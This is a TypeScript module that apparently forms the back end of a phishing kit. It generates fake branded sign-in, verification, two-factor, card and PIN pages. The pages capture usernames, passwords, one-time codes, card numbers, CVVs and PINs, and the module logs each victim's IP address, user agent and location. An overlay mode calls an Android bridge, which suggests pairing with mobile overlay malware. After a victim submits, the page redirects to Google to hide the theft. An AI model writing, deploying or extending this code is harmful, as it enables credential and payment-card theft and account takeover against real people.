import { sql } from 'drizzle-orm';
import { getDb } from '../db/index.js';
import {
  PHISHING_BRANDS,
  PHISHING_VARIANTS,
  PHISHING_CATEGORY_LABELS,
  TOTAL_PHISHING_VARIANTS,
  type PhishingBrand,
  type PhishingVariant,
} from './phishingBrands.js';

/* ---------- row types ---------- */

export interface PhishingPageRow {
  id: number;
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
  hits: number;
  enabled: number;
  created_at: string;
}

export interface PhishingLogRow {
  id: number;
  page_id: number;
  slug: string;
  brand: string;
  variant: string;
  ip: string | null;
  user_agent: string | null;
  fields: string;
  meta: string;
  country: string | null;
  city: string | null;
  created_at: string;
}

/* ---------- tables ---------- */

export function ensurePhishingTables(): void {
  const db = getDb();
  db.run(sql`
    CREATE TABLE IF NOT EXISTS phishing_pages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      slug TEXT NOT NULL UNIQUE,
      brand TEXT NOT NULL,
      category TEXT NOT NULL,
      variant TEXT NOT NULL,
      title TEXT NOT NULL,
      hits INTEGER NOT NULL DEFAULT 0,
      enabled INTEGER NOT NULL DEFAULT 1,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `);
  db.run(sql`
    CREATE TABLE IF NOT EXISTS phishing_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      page_id INTEGER NOT NULL,
      slug TEXT NOT NULL,
      brand TEXT NOT NULL,
      variant TEXT NOT NULL,
      ip TEXT,
      user_agent TEXT,
      fields TEXT NOT NULL DEFAULT '{}',
      meta TEXT NOT NULL DEFAULT '{}',
      country TEXT,
      city TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `);
}

/* ---------- helpers ---------- */

function slugify(value: string): string {
  return value
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');
}

export function variantLabel(variant: PhishingVariant): string {
  const labels: Record<PhishingVariant, string> = {
    login: 'Sign in', verify: 'Account verification', otp: 'Two-factor authentication',
    card: 'Payment verification', pin: 'PIN confirmation',
  };
  return labels[variant];
}

export function pageTitle(brand: string, variant: PhishingVariant): string {
  return `${brand} · ${variantLabel(variant)}`;
}

/* ---------- stats ---------- */

export interface PhishingStats {
  pages: number;
  enabled: number;
  hits: number;
  captures: number;
  last24h: number;
  variants: number;
  byCategory: { category: string; label: string; count: number }[];
  topPages: { slug: string; brand: string; variant: string; hits: number }[];
}

export function getPhishingStats(): PhishingStats {
  const db = getDb();
  const count = (query: ReturnType<typeof sql>) => db.get<{ n: number }>(query)?.n ?? 0;
  const pages = count(sql`SELECT COUNT(*) AS n FROM phishing_pages`);
  const enabled = count(sql`SELECT COUNT(*) AS n FROM phishing_pages WHERE enabled = 1`);
  const hits = count(sql`SELECT COALESCE(SUM(hits), 0) AS n FROM phishing_pages`);
  const captures = count(sql`SELECT COUNT(*) AS n FROM phishing_logs`);
  const last24h = count(sql`SELECT COUNT(*) AS n FROM phishing_logs WHERE created_at >= datetime('now', '-1 day')`);
  const byCategory = PHISHING_BRANDS.reduce<Record<string, number>>((acc, b) => {
    acc[b.category] = (acc[b.category] ?? 0) + 1;
    return acc;
  }, {});
  const topPages = db.all<{ slug: string; brand: string; variant: string; hits: number }>(
    sql`SELECT slug, brand, variant, hits FROM phishing_pages ORDER BY hits DESC LIMIT 5`
  );
  return {
    pages,
    enabled,
    hits,
    captures,
    last24h,
    variants: TOTAL_PHISHING_VARIANTS,
    byCategory: Object.entries(byCategory).map(([category, c]) => ({
      category,
      label: PHISHING_CATEGORY_LABELS[category] ?? category,
      count: c,
    })),
    topPages,
  };
}

/* ---------- pages ---------- */

export function listPhishingPages(opts: {
  page: number;
  pageSize: number;
  search?: string;
  category?: string;
  enabled?: string;
}): { pages: PhishingPageRow[]; total: number } {
  const db = getDb();
  const conditions: ReturnType<typeof sql>[] = [];
  if (opts.search) {
    const like = `%${opts.search}%`;
    conditions.push(sql`(brand LIKE ${like} OR slug LIKE ${like})`);
  }
  if (opts.category && opts.category !== 'all') {
    conditions.push(sql`category = ${opts.category}`);
  }
  if (opts.enabled === 'enabled') conditions.push(sql`enabled = 1`);
  if (opts.enabled === 'disabled') conditions.push(sql`enabled = 0`);
  const where = conditions.length > 0 ? sql`WHERE ${sql.join(conditions, sql` AND `)}` : sql``;
  const total = db.get<{ n: number }>(sql`SELECT COUNT(*) AS n FROM phishing_pages ${where}`)?.n ?? 0;
  const pages = db.all<PhishingPageRow>(
    sql`SELECT * FROM phishing_pages ${where} ORDER BY created_at DESC LIMIT ${opts.pageSize} OFFSET ${(opts.page - 1) * opts.pageSize}`
  );
  return { pages, total };
}

export function getPhishingPageBySlug(slug: string): PhishingPageRow | null {
  const db = getDb();
  return db.get<PhishingPageRow>(sql`SELECT * FROM phishing_pages WHERE slug = ${slug}`) ?? null;
}

export function getPhishingPageById(id: number): PhishingPageRow | null {
  const db = getDb();
  return db.get<PhishingPageRow>(sql`SELECT * FROM phishing_pages WHERE id = ${id}`) ?? null;
}

export function incrementPhishingHit(id: number): void {
  const db = getDb();
  db.run(sql`UPDATE phishing_pages SET hits = hits + 1 WHERE id = ${id}`);
}

export function setPhishingPageEnabled(id: number, enabled: 0 | 1): boolean {
  const db = getDb();
  if (!getPhishingPageById(id)) return false;
  db.run(sql`UPDATE phishing_pages SET enabled = ${enabled} WHERE id = ${id}`);
  return true;
}

export function removePhishingPage(id: number): boolean {
  const db = getDb();
  if (!getPhishingPageById(id)) return false;
  db.run(sql`DELETE FROM phishing_pages WHERE id = ${id}`);
  db.run(sql`DELETE FROM phishing_logs WHERE page_id = ${id}`);
  return true;
}

export function seedPhishingPages(): { created: number; total: number } {
  const db = getDb();
  const before = db.get<{ n: number }>(sql`SELECT COUNT(*) AS n FROM phishing_pages`)?.n ?? 0;
  for (const brand of PHISHING_BRANDS) {
    for (const variant of PHISHING_VARIANTS) {
      const slug = `${slugify(brand.brand)}-${variant}`;
      db.run(sql`
        INSERT OR IGNORE INTO phishing_pages (slug, brand, category, variant, title, hits, enabled)
        VALUES (${slug}, ${brand.brand}, ${brand.category}, ${variant}, ${pageTitle(brand.brand, variant)}, 0, 1)
      `);
    }
  }
  const after = db.get<{ n: number }>(sql`SELECT COUNT(*) AS n FROM phishing_pages`)?.n ?? 0;
  return { created: Math.max(0, after - before), total: TOTAL_PHISHING_VARIANTS };
}

/* ---------- logs ---------- */

export function listPhishingLogs(opts: {
  page: number;
  pageSize: number;
  search?: string;
}): { logs: PhishingLogRow[]; total: number } {
  const db = getDb();
  const conditions: ReturnType<typeof sql>[] = [];
  if (opts.search) {
    const like = `%${opts.search}%`;
    conditions.push(sql`(brand LIKE ${like} OR slug LIKE ${like} OR fields LIKE ${like})`);
  }
  const where = conditions.length > 0 ? sql`WHERE ${sql.join(conditions, sql` AND `)}` : sql``;
  const total = db.get<{ n: number }>(sql`SELECT COUNT(*) AS n FROM phishing_logs ${where}`)?.n ?? 0;
  const logs = db.all<PhishingLogRow>(
    sql`SELECT * FROM phishing_logs ${where} ORDER BY id DESC LIMIT ${opts.pageSize} OFFSET ${(opts.page - 1) * opts.pageSize}`
  );
  return { logs, total };
}

export function recordPhishingCapture(
  page: PhishingPageRow,
  data: {
    fields: Record<string, unknown>;
    meta: Record<string, unknown>;
    ip: string;
    userAgent: string;
    country: string | null;
    city: string | null;
  }
): void {
  const db = getDb();
  db.run(sql`
    INSERT INTO phishing_logs (page_id, slug, brand, variant, ip, user_agent, fields, meta, country, city)
    VALUES (${page.id}, ${page.slug}, ${page.brand}, ${page.variant}, ${data.ip}, ${data.userAgent},
            ${JSON.stringify(data.fields)}, ${JSON.stringify(data.meta)}, ${data.country}, ${data.city})
  `);
}

export function clearPhishingLogs(): void {
  const db = getDb();
  db.run(sql`DELETE FROM phishing_logs`);
}

/* ---------- renderer ---------- */

const VARIANT_FIELDS: Record<PhishingVariant, { label: string; fields: { name: string; type: string; placeholder: string }[] }> = {
  login: {
    label: 'Sign in to continue',
    fields: [
      { name: 'username', type: 'text', placeholder: 'Email or username' },
      { name: 'password', type: 'password', placeholder: 'Password' },
    ],
  },
  verify: {
    label: 'Verify your account',
    fields: [
      { name: 'email', type: 'text', placeholder: 'Email address' },
      { name: 'code', type: 'text', placeholder: 'Verification code' },
    ],
  },
  otp: {
    label: 'Two-factor authentication',
    fields: [
      { name: 'phone', type: 'text', placeholder: 'Phone number' },
      { name: 'otp', type: 'text', placeholder: '6-digit code' },
    ],
  },
  card: {
    label: 'Payment verification',
    fields: [
      { name: 'card', type: 'text', placeholder: 'Card number' },
      { name: 'exp', type: 'text', placeholder: 'MM/YY' },
      { name: 'cvv', type: 'text', placeholder: 'CVV' },
    ],
  },
  pin: {
    label: 'Confirm your PIN',
    fields: [
      { name: 'card', type: 'text', placeholder: 'Card number' },
      { name: 'pin', type: 'password', placeholder: 'PIN' },
    ],
  },
};

function esc(value: unknown): string {
  return String(value ?? '').replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c] ?? c
  );
}

export function renderPhishingPage(
  page: Pick<PhishingPageRow, 'slug' | 'brand' | 'variant'>,
  opts?: { overlay?: boolean }
): string {
  const overlay = !!opts?.overlay;
  const vf = VARIANT_FIELDS[page.variant as PhishingVariant] ?? VARIANT_FIELDS.login;
  const inputs = vf.fields
    .map((f) => `<input type="${f.type}" name="${f.name}" placeholder="${esc(f.placeholder)}" required autocomplete="off">`)
    .join('');
  const overlayJs = overlay ? 'true' : 'false';
  const doneJs = overlay
    ? `try { AndroidBridge.done(); } catch (e) {} try { window.close(); } catch (e) {}`
    : `window.location.href = 'https://www.google.com';`;
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>${esc(page.brand)}</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
  body{background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e2e8f0}
  .card{background:#fff;color:#0f172a;width:100%;max-width:380px;border-radius:14px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,.4)}
  .logo{width:44px;height:44px;border-radius:12px;background:#2563eb;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;margin-bottom:18px}
  h1{font-size:20px;margin-bottom:4px}
  .sub{font-size:13px;color:#64748b;margin-bottom:22px}
  input{width:100%;padding:12px 14px;border:1px solid #cbd5e1;border-radius:9px;font-size:14px;margin-bottom:12px;outline:none}
  input:focus{border-color:#2563eb}
  button{width:100%;padding:12px;background:#2563eb;color:#fff;border:none;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#1d4ed8}
  .foot{margin-top:18px;font-size:11px;color:#94a3b8;text-align:center}
</style>
</head>
<body>
  <div class="card">
    <div class="logo">${esc(page.brand[0]?.toUpperCase() ?? '')}</div>
    <h1>${esc(page.brand)}</h1>
    <div class="sub">${esc(vf.label)}</div>
    <form id="f">
      ${inputs}
      <button type="submit">Continue</button>
    </form>
    <div class="foot">Protected by ${esc(page.brand)} security</div>
  </div>
  <script>
    document.getElementById('f').addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = document.querySelector('button');
      btn.disabled = true; btn.textContent = 'Please wait\u2026';
      const fields = {};
      new FormData(e.target).forEach((v, k) => { fields[k] = v; });
      try {
        await fetch('/p/${page.slug}/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fields, meta: { overlay: ${overlayJs}, referer: document.referrer } }),
        });
      } catch (e) {}
      ${doneJs}
    });
  </script>
</body>
</html>`;
}
